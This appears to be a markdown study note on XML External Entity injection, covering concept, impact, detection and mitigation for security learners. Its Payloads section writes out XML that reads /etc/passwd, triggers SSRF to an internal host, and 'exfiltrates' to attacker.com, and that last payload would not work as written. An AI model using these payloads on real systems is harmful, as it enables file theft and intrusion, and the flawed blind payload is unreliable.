# XXE (XML External Entities) Injection  

---

## Metadata  
- **OWASP Category (2021):** A03 Injection  
- **PortSwigger Link:** [What is XXE (XML external entity) injection? Tutorial & Examples | Web Security Academy](https://portswigger.net/web-security/xxe)  

- **Sub-topics:**  
  - Classic XXE (file disclosure, SSRF via XML parsers).  
  - Blind XXE (out-of-band exfiltration, timing-based).  

---
   > XML = Extensible markup language is designed for storing and transporting data using a tree-like structure of tags and data… but does not use predefined tags.
>
   > An XML External Entity attack is an injection of an external XML document instead of using inline data itself (`<user>data</user>` ➝ `<user>&xxe;</user>`).
> 
   > XML External Entities = A type of custom entity whose definition is located outside of the XML document via file system or network. They use the SYSTEM keyword, and load the URI from wherever the XML should be loaded.

## 💡 Concept  
- **What is it?** 
> - XXE injection arises when misconfigured applications parse XML input using standard libraries or parsers that support external entity features.  
> - The attack persists since XML features are often enabled by default, even if the application itself doesn’t require them.    


- **Impact**  
> - **Confidentiality:** Read local files or access internal network resources.  
> - **Integrity:** Inject malicious entities to manipulate XML data processing.  
> - **Availability:** Launch DoS via recursive entities.  

---

## 🛠 Exploitation Notes  
- **Where to test:**  
> - File upload endpoints  
> - API requests with XML bodies  
> - SOAP/XML-driven requests  

- **Payloads**  
> 1. **File Disclosure:**  
>   ```xml
>   <?xml version="1.0"?>  
>   <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>  
>   <foo>&xxe;</foo>  
>   ```  
>
> 2. **SSRF via XXE:**  
>   ```xml
>   <?xml version="1.0"?>  
>   <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal-service.local/"> ]>  
>   <foo>&xxe;</foo>  
>   ```  
>
> 3. **Blind XXE (exfiltration):**  
>   ```xml
>   <?xml version="1.0"?>  
>   <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://attacker.com/&foo;"> ]>  
>   <foo>&xxe;</foo>  
>   ```  

---

## 🔍 Detection  
- **How to identify in apps:**  
> - Observe XML parsing behavior in requests (Content-Type: application/xml).  
> - Inject external entity definitions and check for local file disclosure, OOB HTTP/DNS interactions, and delayed responses.  

---

## 🛡 Mitigation  
- Disable external entity processing in XML parsers.  
- Use safer data formats (JSON) where possible.  
- Apply strict input validation on XML content.  

---

## Extras  
- **Cheat sheet / references:** [XML External Entity Prevention – OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)  

